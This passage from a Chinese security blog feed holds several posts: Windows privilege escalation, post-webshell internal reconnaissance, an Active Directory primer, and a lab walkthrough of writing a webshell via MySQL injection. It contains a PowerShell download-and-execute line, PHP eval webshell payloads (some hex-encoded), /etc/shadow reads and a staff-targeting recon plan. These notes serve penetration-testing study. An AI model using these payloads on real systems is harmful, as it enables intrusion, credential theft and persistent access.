<p>一般来说，权限的指派过程实际上就是为某个资源指定安全主体（即用户、用户组等）可以拥有怎样的操作过程。</p>
</li>
</ul>
<p><strong>参考资料：</strong></p>
<p><a href="https://www.cnblogs.com/milantgh/p/3617855.html">Windows之权限讲解</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1681365">Windows用户和组</a></p>
<p>Windows 内置用户账户：</p>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>权限</strong></th>
<th style="text-align:center"><strong>详细</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">User</td>
<td style="text-align:center">普通用户权限</td>
</tr>
<tr>
<td style="text-align:center">Administrator</td>
<td style="text-align:center">管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码）</td>
</tr>
<tr>
<td style="text-align:center">System</td>
<td style="text-align:center">系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump</td>
</tr>
<tr>
<td style="text-align:center">TrustedInstaller</td>
<td style="text-align:center">最高权限，可以操作系统文件</td>
</tr>
</tbody>
</table>
<h3 id="内核漏洞提权">内核漏洞提权</h3>
<ol>
<li>
<p>将目标主机补丁号导出：</p>
<pre><code class="language-bash">systeminfo &gt; 1.txt
或
wmic qfe get Caption,Description,HotFixID,InstalledOn &gt; 1.txt
</code></pre>
</li>
<li>
<p>通过脚本判断是否存在未打补丁的漏洞：</p>
<p>https://github.com/bitsadmin/wesng.git</p>
<p>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>
<p>或根据在线网站检测：</p>
<p>https://bugs.hacking8.com/tiquan</p>
</li>
<li>
<p>下载对应的EXP，并执行利用：</p>
<p>https://www.exploit-db.com/</p>
</li>
<li>
<p>可能遇到的问题：EXP被杀。将EXP改成Powershell，使用powershell下载利用代码并执行：</p>
<pre><code class="language-bash">Powershell IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:8000/ms16-032.ps1');Invoke-MS16-032
</code></pre>
<p>参考：</p>
<p>https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</p>
<p>https://www.cnblogs.com/xiaozi/p/13534602.html</p>
</li>
</ol>
<h3 id="dll劫持提权"><strong>DLL劫持提权</strong></h3>
<h4 id="基础介绍">基础介绍</h4>
<p>DLL是Microsoft引入的，用于实现共享库的概念。它是一个库文件，代表动态链接库，其中包含可被多个应用程序同时动态访问和使用的<strong>代码和数据</strong>。</p>
<p>Windows2003以上以及win7以上操作系统（<a href="http://sh1yan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/">其他系统版本参考</a>），通过“<strong>DLL路径搜索目录顺序</strong>”和“<strong>KnownDLLs注册表项</strong>”的机制来确定应用程序启动时所要调用的DLL的路径，之后应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
<p>应用程序动态访问DLL的<strong>搜索目录顺序</strong>：</p>
<ol>
<li>从应用程序的目录中加载</li>
<li>32位系统目录（C：\ Windows \ System32）</li>
<li>16位系统目录（C：\ Windows \ System）</li>
<li>Windows目录（C：\ Windows）</li>
<li>当前工作目录（CWD）</li>
<li>PATH环境变量中的目录（首先是系统，然后是用户）</li>
</ol>
<p><strong>KnownDLLs注册表项机制</strong>：凡是此项下的DLL文件就会被禁止从应用程序自身所在的目录下调用，而只能从系统目录即<strong>SYSTEM32目录</strong>下调用。</p>
<p>注册表位置：</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605363395360.png" alt="" loading="lazy"></figure>
<h4 id="利用条件"><strong>利用条件：</strong></h4>
<ul>
<li>
<p>DLL</p>
<p>可以看出，如果存在DLL即不在KnownDLLs里，开发人员也没有定义绝对路径时，应用程序就会按照目录顺序去搜索。</p>
</li>
<li>
<p>权限</p>
<p>当前用户有权限对要劫持的DLL目录进行<strong>读写</strong>操作。</p>
</li>
</ul>
<p>在上述条件下，我们就可以在应用程序搜索到system32之前，也就是应用程序目录中，放入我们编写好的恶意劫持DLL，等待应用程序调用。</p>
<h4 id="利用过程"><strong>利用过程：</strong></h4>
<p>参考倾旋师傅的文章：<a href="https://payloads.online/archivers/2018-06-09/1">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a></p>
<h3 id="错误的服务权限配置">错误的服务权限配置</h3>
<h4 id="基础介绍-2"><strong>基础介绍</strong></h4>
<p>通常情况下，一些Web控件、网络客户端会在本地计算机中注册一些<strong>服务</strong>，这些服务在<strong>开机后自启动</strong>，而自启动的<strong>权限又是SYSTEM</strong>。</p>
<p>在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
</code></pre>
<p>服务在开机后自启动时，Windows将会搜索要执行的<a href="https://blog.csdn.net/simmel_92/article/details/89064977">二进制文件</a>。并在binPath属性中声明要执行的二进制文件的位置。如果二进制文件的路径不是一个绝对路径时，Windows将从路径开头的所有文件夹中进行搜索。</p>
<p>例如binPath路径如下：</p>
<pre><code class="language-bash">C:\Program Files\Unquoted Path Service\Common Files\service.exe
</code></pre>
<p>则搜索顺序为：</p>
<ol>
<li>C:\Program.exe</li>
<li>C:\Program Files\Unquoted.exe</li>
<li>C:\Program Files\Unquoted Path.exe</li>
<li>C:\Program Files\Unquoted Path Service\Common.exe</li>
<li>C:\Program Files\Unquoted Path Service\Common Files\service.exe</li>
</ol>
<h4 id="利用条件-2">利用条件：</h4>
<ul>
<li>若服务注册表的<strong>修改权限</strong>当前用户可控，那就可以直接修改<code>binPath</code>的值，指向到本地其他路径，获得这个服务的权限。</li>
<li>若这个binPath所指向的<strong>目录权限</strong>可控，那么我们也可以把二进制文件替换成木马，从而当服务启动的时候，就能够执行我们的木马。</li>
<li>若<code>binPath</code>的值<strong>不是一个绝对路径</strong>时，可以通过Windows的特性（按搜索顺序查找二进制文件）来提权：将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。</li>
</ul>
<h4 id="利用过程-2">利用过程：</h4>
<p>首先需要在找到存在配置权限错误的服务，<strong>PowerUp</strong>和<strong>winPEAS</strong>是最有用的工具，PowerUp用PowerShell编写，而winPEAS用C＃编写。将需要.NET Framework 4.0来运行winPEAS：</p>
<pre><code class="language-bash">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605363418625.png" alt="" loading="lazy"></figure>
<p>关于Powerup的使用：<a href="https://evi1cg.me/archives/Powerup.html">Powrshell 提权框架-Powerup</a></p>
<p>接下来上传我们的木马，重启服务，即可获得该服务权限。</p>
<p>实际操作流程可参考：</p>
<p><a href="https://payloads.online/archivers/2018-10-08/1">Windows本地提权提升技巧</a></p>
<p><a href="https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842">Escalate Privileges in windows</a></p>
<p><a href="https://mp.weixin.qq.com/s/lNyvyW2Pq9abIC9ViJteaQ">红队测试之Windows提权小结</a></p>
<h3 id="mysql提权">Mysql提权</h3>
<p>搬运一下先知上总结好的文章：</p>
<p><a href="https://xz.aliyun.com/t/2719">Windows下三种mysql提权剖析</a></p>
<p><a href="https://xz.aliyun.com/t/7392">mysql数据库漏洞利用及提权方式小结</a></p>
<h3 id="协议提权potato">协议提权（Potato）</h3>
<p>土豆太多了，先mark一下，后面有时间再吃：</p>
<ul>
<li>
<p>Hot Potato</p>
<p>利用已知的Windows中的问题，以获得本地权限提升。</p>
<p>其中利用NTML中继（特别是基于HTTP &gt; SMB中继）和NBNS欺骗进行提权。</p>
<p><a href="https://www.freebuf.com/articles/system/93484.html">Windows提权姿势之Hot Potato</a></p>
</li>
<li>
<p>Rotten Potato</p>
<p><a href="https://www.anquanke.com/post/id/92908">The lonely potato</a></p>
</li>
<li>
<p>Juicy Potato</p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">Windows本地提权工具Juicy Potato测试分析</a></p>
</li>
<li>
<p>Ghost Potato</p>
<p><a href="https://xz.aliyun.com/t/7087">Ghost Potato 复现(Cve-2019-1384)</a></p>
</li>
<li>
<p>Pipe Potato</p>
<p><a href="https://www.t00ls.net/articles-56281.html">pipePotato复现</a></p>
<p><a href="https://www.anquanke.com/post/id/204510">pipePotato：一种新型的通用提权漏洞</a></p>
</li>
<li>
<p>Potato家族本地提权细节</p>
<p>https://xz.aliyun.com/t/7776</p>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何进行内网信息搜索]]></title>
        <id>https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/</id>
        <link href="https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/">
        </link>
        <updated>2020-11-12T08:41:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>从亮神分享的文章中学到了很多，记录了下来：</p>
<blockquote>
<p>目标<code>资产信息</code>搜集的程度，决定<code>渗透过程</code>的复杂程度。</p>
<p>目标<code>主机信息</code>搜集的深度，决定后渗透<code>权限持续把控</code>。</p>
<p>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p>
<p>——Micropoor</p>
</blockquote>
<p>一次完整的网络渗透，不仅仅是与目标管理人员的权限争夺，一次完整的网络渗透，它分为两大块，技 术业务与信息分析业务。</p>
<p>而技术业务要辅助并且要为信息分析业务提供强大的支撑与保证。同时信息分析业务要为技术业务提供 关键的目标信息分析逻辑关系与渗透方向。</p>
<p>在得到一个webshell时，非root/administrator权限的情况下，对目标信息搜集至关重要，它会影响到后期的渗透是否顺利，以及渗透方向。</p>
<h3 id="主机信息">主机信息</h3>
<p><strong>查询用户信息：</strong></p>
<p>了解当前用户权限，判断是否需要进一步提升权限。</p>
<pre><code class="language-bash">win：
	whoami：显示当前用户信息
	net user：显示主机系统中所有用户信息
linux：
	whoami
	id
	cat /etc/shadow、cat /etc/passwd
</code></pre>
<p><strong>查询网络信息：</strong></p>
<p>确认目标主机所连接的网络情况：</p>
<pre><code class="language-bash">win：
	TCP/IP配置：ipconfig、ipconfig /all
	端口：netstat -ano
	ARP表：arp -a 
	路由表: route print
	dns缓存记录：ipconfig/displaydns
linux：
	ifconfig、netstat -anplt
    ARP表:arp -a 
    路由表:route -n
    查看登录日志获取登录来源ip：lastlog
</code></pre>
<p><strong>查询系统信息：</strong></p>
<p>确认主机操作系统名称和版本信息</p>
<pre><code class="language-bash">win:
	systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
	systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;
Linux: 
	uname -a ：通过查看内核版本 
</code></pre>
<p><strong>查询补丁更新信息：</strong></p>
<p>获取当前主机补丁更新情况，可用来辅助<strong>提升权限</strong>。</p>
<pre><code class="language-bash">win：
	systeminfo
	wmic qfe get Caption,Description,HotFixID,InstalledOn
Linux: uname -a ：通过查看内核版本 
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605170574964.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605170579520.png" alt="" loading="lazy"></figure>
<p><strong>查询进程列表：</strong></p>
<p>查看当前进程列表，重点关注安全软件，为了后续免杀做准备。</p>
<pre><code class="language-bash">win：
	tasklist
    wmic process list brief
linux: 
	ps
	top
</code></pre>
<p>注：要熟悉国内常见点杀软。</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1605170664939.png" alt="" loading="lazy"></figure>
<p><strong>查询安装的软件及版本、路径等</strong></p>
<pre><code class="language-bash">win:
	wmic product get name,version &gt; ins.txt : 通过wmic将命令信息导出
	powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; ：通过powershell命令收集软件的版本信息
	
linux:
	rpm -q：来查询安装了哪些软件包
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1605170621708.png" alt="" loading="lazy"></figure>
<p><strong>查询主机服务信息</strong></p>
<pre><code class="language-bash">wmic service list brief
</code></pre>
<h3 id="资产信息">资产信息</h3>
<p>服务器端存有敏感信息，通过收集各种登录凭证以便扩大战果。</p>
<pre><code class="language-bash">Windows：
	本地密码Hash和明文密码/抓取浏览器密码/服务端明文密码
linux：
	history记录敏感操作/shadow文件破解/mimipenguin抓取密码/使用Strace收集登录凭证/全盘搜索敏感信息
</code></pre>
<h3 id="域内信息收集"><strong>域内信息收集</strong></h3>
<p>搜集完本机相关信息后，就需要判断当前主机是否在域内，如果在域内，就需要进一步收集域内信息</p>
<p><strong>判断是否有域</strong><br>
一般域服务器都会同时作为时间服务器，所以使用下面命令判断：</p>
<pre><code class="language-bash">运行 net time /domain 该命令后，一般会有如下三种情况:
1、存在域，但当前用户不是域用户，提示说明权限不够
 	 C:\Users&gt;WWW&gt;net time /domain
 	 System error 5 has occurred.
 	 Access is denied.
 	 
2、存在域，并且当前用户是域用户
  	 C:\Windows\system32&gt;net time /domain
  	 Current time at \\owa.god.org is 2020/11/12 16:05:49
  	 The command completed successfully.
	
3、当前网络环境为工作组，不存在域
  	 C:\Users\Administrator&gt;net time /domain
  	 The domain controller for the domain WORKGROUP could not 	   be found.
</code></pre>
<p><strong>域用户信息搜集：</strong></p>
<pre><code class="language-bash">net user /domain //获取域用户列表
net group /domain  //查询域内所有用户组列表
net group “Domain Admins” /domain //查询“域管理员组用户”列表
net group &quot;Domain Controllers&quot; /domain  //查看“域控制器组”用户
net localgroup administrators /domain  //查询“本地管理员组”用户
</code></pre>
<p>正如上面所说，技术业务需要辅助分析业务。在域组中，其中有几个组需要特别关注，在一般的大型内 网渗透中，需要关注大致几个组</p>
<p>（1）IT组/研发组 他们掌握在大量的内网密码，数据库密码等。</p>
<p>（2）秘书组 他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业 务来确定渗透方向</p>
<p>（3）domain admins组 root/administrator</p>
<p>（4）财务组 他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组 织的整体架构</p>
<p>（5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。</p>
<p>以xxx组为例：xxx组共计x人。</p>
<p>并且开始规划信息刺探等级：</p>
<p>等级1：确定某部门具体人员数量 如研发中心4人</p>
<p>等级2：确定该部门的英文用户名的具体信息，如姓名，联系方式，邮箱，职务等。以便确定下一步攻 击方向</p>
<p>等级3：分别刺探白天/夜间 内网中所存活机器并且对应IP地址</p>
<p>等级4： 对应人员的工作机内网IP，以及工作时间</p>
<p>等级5： 根据信息业务反馈，制定目标安全时间，以便拖拽指定人员文件，或登录目标机器</p>
<p>等级6： 制定目标机器后渗透与持续渗透的方式以及后门</p>
<p>以上只是思路，后续内容可就不搬运了，详细内容可直接去GitHub：<a href="https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf">渗透的本质是信息收集</a></p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1605170709895.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1605170713702.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1605170717677.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1605170721876.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1605170726984.png" alt="" loading="lazy"></figure>
<p><strong>找到域控</strong><br>
一般来说，域控服务器IP地址为DNS服务器地址，找到DNS服务器地址就可以定位域控</p>
<pre><code class="language-bash">nslookup/ping 域名,解析到域控服务器IP地址
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1605170731898.png" alt="" loading="lazy"></figure>
<h3 id="参考链接">参考链接</h3>
<p><a href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网信息收集之本机信息收集</a></p>
<p><a href="https://mp.weixin.qq.com/s/o19f28x50dDICcActdvqXw">如何进行内网信息收集</a></p>
<p><a href="https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf">渗透的本质是信息收集（第五十二课）</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域环境搭建]]></title>
        <id>https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/</id>
        <link href="https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/">
        </link>
        <updated>2020-11-03T12:19:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>本想记录一下搭建域环境的学习过程，但是发现倾旋师傅的文章<a href="https://payloads.online/archivers/2019-04-13/1">最快的方式搭建域环境</a>写的非常详细，于是准备写一写有关于域的相关基础知识。</p>
<h3 id="域和工作组">域和工作组</h3>
<ul>
<li>
<p><strong>工作组</strong></p>
<p>工作组是最简单的Windows资源管理模式，它具有<code>分布式管理</code>功能。每个用户独立的管理自己的计算机，只能在其计算机上使用其登陆凭证进行登录。大多数存储是分布式的。每个设备都有自己的专用存储。</p>
</li>
<li>
<p><strong>域</strong></p>
<p>域是客户端/服务器的网络资源管理模式，具有<code>集中管理</code>功能。用户使用其登陆凭证可以在域中的任何设备登录，所有设备都可以在集中设备（DC）上进行管理，所有用户数据都集中存储。</p>
</li>
</ul>
<p><strong>区别</strong>：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">域</th>
<th style="text-align:center">工作组</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1、</td>
<td style="text-align:center">域中的计算机具有集中式数据库。</td>
<td style="text-align:center">工作组中的计算机主要具有自己的本地数据库。</td>
</tr>
<tr>
<td style="text-align:center">2、</td>
<td style="text-align:center">域主要是仅传输和共享敏感的重要数据。</td>
<td style="text-align:center">工作组仅由于安全性较低而用于共享安全性和个人数据较少的内容。</td>
</tr>
<tr>
<td style="text-align:center">3、</td>
<td style="text-align:center">域主要是大型公共和企业网络的首选。</td>
<td style="text-align:center">工作组主要是小型局域网的首选，例如学校，学院，建筑物等。</td>
</tr>
<tr>
<td style="text-align:center">4、</td>
<td style="text-align:center">由于安全性，域用于传输和共享敏感的重要数据。</td>
<td style="text-align:center">由于安全性较低，工作组用于共享个人数据。</td>
</tr>
<tr>
<td style="text-align:center">5、</td>
<td style="text-align:center">域对于大量设备可以更好地工作。</td>
<td style="text-align:center">工作组对较少的计算机更好地工作。</td>
</tr>
<tr>
<td style="text-align:center">6、</td>
<td style="text-align:center">域名由域控制器根据IP地址提供。</td>
<td style="text-align:center">在工作组中，没有任何依赖于硬件组件和服务器的名称分配。</td>
</tr>
<tr>
<td style="text-align:center">7、</td>
<td style="text-align:center">可以从集中式存储中的域中恢复数据。</td>
<td style="text-align:center">由于每个设备的本地存储，因此无法在工作组中进行数据恢复。</td>
</tr>
<tr>
<td style="text-align:center">8、</td>
<td style="text-align:center">可以使用一个或多个不同网络域的设备并向其中添加所有预期的设备来形成域。</td>
<td style="text-align:center">同一网络中的设备只能添加到工作组中。</td>
</tr>
</tbody>
</table>
<h3 id="dcdomain-controller">DC（Domain Controller）</h3>
<p>在域管理模式下，负责响应Windows Server域中的安全身份验证请求的服务器称为“域控制器（Domain Controller，简写为DC）。网络管理员通过在<code>域控制器</code>上集中管理大量的pc机。</p>
<p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的<code>数据库</code>。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。</p>
<h3 id="adactive-directory">AD（Active Directory）</h3>
<p>Active Directory（AD）是Microsoft专有的<code>目录服务</code>。它在Windows Server上运行，用于管理网络上的设备和资源。</p>
<p>目录是一种分层结构，用于存储有关网络上对象的信息。而目录服务，例如Active Directory域服务（AD DS），提供了用于<code>存储目录数据</code>，并使网络用户和管理员可以<code>使用此数据</code>的方法。</p>
<p>域内所有的计算机共享一个集中式的目录数据库（又称为AD数据库），它包含着整个域内的<code>对象</code>（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的操作（增删修改）。</p>
<p>所以建立域控制器服务器的过程，其实就是安装AD的过程。</p>
<h3 id="域-树-林-组织单位">域、树、林、组织单位</h3>
<p>Active Directory域服务使用由域，树和林组成的分层布局来协调网络元素。</p>
<ul>
<li>
<p>域</p>
<p>域是一组对象。如用户或设备，共享相同AD数据库。域具有域名系统（DNS）结构。</p>
</li>
<li>
<p>树</p>
<p>树是是组合在一起的一个或多个域。树结构使用连续的名称空间来收集逻辑层次结构中的域集合。可以将树视为信任关系，其中在两个域之间共享安全连接或信任。</p>
</li>
<li>
<p>林</p>
<p>林是有一棵或多棵域树组成的，每棵域树独享连续的命名空间，不同域树之间没有命名空间的连续性。林中第一棵域树的根域也整个林的根域，同时也是林的名称。</p>
</li>
<li>
<p>组织单位</p>
<p>组织用户，组和设备。每个域可以包含自己的OU。但是，OU不能具有单独的名称空间，因为域中的每个用户或对象都必须是唯一的。例如，无法创建具有相同用户名的用户帐户。</p>
</li>
</ul>
<p><strong>参考链接：</strong></p>
<p>https://www.geeksforgeeks.org/difference-between-domain-and-workgroup/</p>
<p>https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</p>
<p>https://blog.csdn.net/qq_39101049/article/details/99678671</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mysql注入点写Webshell]]></title>
        <id>https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/</id>
        <link href="https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/">
        </link>
        <updated>2020-10-28T01:52:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="基础知识">基础知识</h2>
<h3 id="指令基础">指令基础</h3>
<p>在 MySQL 中，可以使用 SELECTI...INTO OUTFILE 语句，将表的数据导出成一个文件。</p>
<p>语法格式如下：</p>
<pre><code class="language-mysql">SELECT 列名 FROM table [WHERE 语句] INTO OUTFILE '目标文件'[OPTIONS]
</code></pre>
<p><code>SELECT</code>语句查询出所需数据，然后将其导出到<code>目标文件</code>中，<code>OPTIONS</code>为可选参数，常用值如下：</p>
<ul>
<li>FIELDS TERMINATED BY '字符串'：为字段之间设置字符串作为分隔符</li>
<li>COLUMNS TERMINATED BY '字符串'：为列之间设置字符串作为分隔符</li>
<li>LINES TERMINATED BY '字符串'：为每行数据结尾设置字符串</li>
<li>LINES STARTING BY '字符串'：为每行数据开头设置字符串</li>
</ul>
<h3 id="环境条件">环境条件</h3>
<blockquote>
<p>注入点：select注入点</p>
<p>数据库用户：File权限</p>
<p>secure_file_priv：支持web目录文件导出</p>
<p>物理路径：'G:/Tools/phpstudy_pro/WWW/sqli-labs/'</p>
<p>数据库和Web服务器在同一台服务器上</p>
</blockquote>
<ul>
<li><strong>File权限</strong></li>
</ul>
<p>指的是数据库用户能否对服务器主机上的文件进行读写操作，这样才可以执行select into outfile，load data infile操作。</p>
<ul>
<li><strong>secure_file_priv</strong></li>
</ul>
<p>secure-file-priv是mysql的新特性，用来限制对读写文件的权限，即规定了select into outfile，load data infile操作的目录。</p>
<p>通过以下命令可以查看secure-file-priv的值：</p>
<pre><code class="language-sql">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;secure-file-priv;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603850118588.png" alt="" loading="lazy"></figure>
<p>目前环境下的值为NULL，即不允许导入导出。</p>
<p>经查资料，secure-file-priv的值的：</p>
<p>（1）NULL，表示禁止。</p>
<p>（2）如果value值有文件夹目录，则表示只允许该目录下文件（PS：测试子目录也不行）。</p>
<p>（3）如果为空，则表示不限制目录。</p>
<p>可以在mysql的配置文件中（Windows下为my.ini, Linux下的my.cnf），修改值（如果没有就自己加上）。这里直接设置为不限制目录，然后重启数据库：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603850125437.png" alt="" loading="lazy"></figure>
<p>这里踩了很久的坑，使用phpstudy的mysql，如果直接用Windows的笔记本打开my.ini，会导致后续数据库启动失败。</p>
<p>然后查看是否修改成功：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603850131228.png" alt="" loading="lazy"></figure>
<h2 id="getshell">Getshell</h2>
<h3 id="1-利用-union-select">1、利用 union select</h3>
<p>当注入点为<code>union注入</code>时，利用 union select &quot;一句话木马&quot; into outfile '物理路径/xxx.php'，将一句话导出到xxx.php中。</p>
<pre><code class="language-php">?id=1 union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php&quot;--
</code></pre>
<h3 id="2-利用-opetions分隔符">2、利用 OPETIONS（分隔符）</h3>
<p>当Mysql注入点为<code>盲注</code>或<code>报错注入</code>时，union select 的写入方式不可行。</p>
<p>通过添加OPTIONS直接在Sql语句后面写入一句话（常用的四种都可使用）：</p>
<pre><code class="language-mysql">?id=1 LIMIT 0,1 INTO OUTFILE 'G:/Tools/phpstudy_pro/WWW/sqli-labs/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
</code></pre>
<h3 id="3-日志getshell">3、日志getshell</h3>
<p>新版本的MySQL设置了secure_file_priv导出文件的路径，所以无法通过使用select into outfile来写入一句话。也很难去修改Mysql的配置文件。</p>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603850170057.png" alt="" loading="lazy"></figure>
<p>该环境下还可以通过修改MySQL的log文件来获取Webshell。当开启日志后，Mysql会记录执行的SQL语句，通过把Webshell写入日志的方式来利用。</p>
<ul>
<li>
<p>环境条件：</p>
<p>数据库用户：<code>Super</code>和<code>File</code>服务器权限</p>
<p>物理路径：G:/Tools/phpstudy_pro/WWW/log.php</p>
</li>
<li>
<p>步骤</p>
<p>连接上Mysql后，执行如下命令：</p>
<pre><code class="language-mysql">//1、查询日志情况：
show variables like '%general%';   
//2、开启日志general log：
set global general_log = on;
//3、设置日志路径
set global general_log_file = 'G:/Tools/phpstudy_pro/WWW/webshell.php';
//4、写Webshell
select '&lt;?php eval($_GET[passwd]);?&gt;'             
//5、关闭日志
set global general_log=off;                  
</code></pre>
</li>
</ul>
<h2 id="靶场练习">靶场练习</h2>
<h3 id="1-环境搭建">1、环境搭建</h3>
<blockquote>
<p>靶场：https://github.com/Audi-1/sqli-labs</p>
<p>环境：phpstudy集成环境（Windows + Mysql + php + Apache）</p>
<p>数据库连接用户：root</p>
<p>secure_file_priv：secure_file_priv =</p>
</blockquote>
<p>此外在靶场网站路径下准备一个phpinfo.php（获取网站绝对路径使用）</p>
<h3 id="2-测试">2、测试</h3>
<p>注入点如下：</p>
<pre><code class="language-html+php">http://192.168.31.128/sqli-labs/Less-1/?id=1
</code></pre>
<p>进行简单的sql注入检测：</p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603850422253.png" alt="" loading="lazy"></figure>
<p>通过单引号触发sql语法报错，得到以下信息：</p>
<ul>
<li>Mysql数据库</li>
<li>参数是单引号闭合</li>
</ul>
<p>进一步通过布尔逻辑来验证注入点：</p>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603850428657.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603850432457.png" alt="" loading="lazy"></figure>
<p>证实该注入点的存在。</p>
<p>有明显的数据回显，先试一试union注入是否可以：</p>
<ul>
<li>order by 测试字段数</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603850439217.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603850444296.png" alt="" loading="lazy"></figure>
<p>字段3排序正常，字段4报错，可以得出数据库表有三个字段。</p>
<ul>
<li>
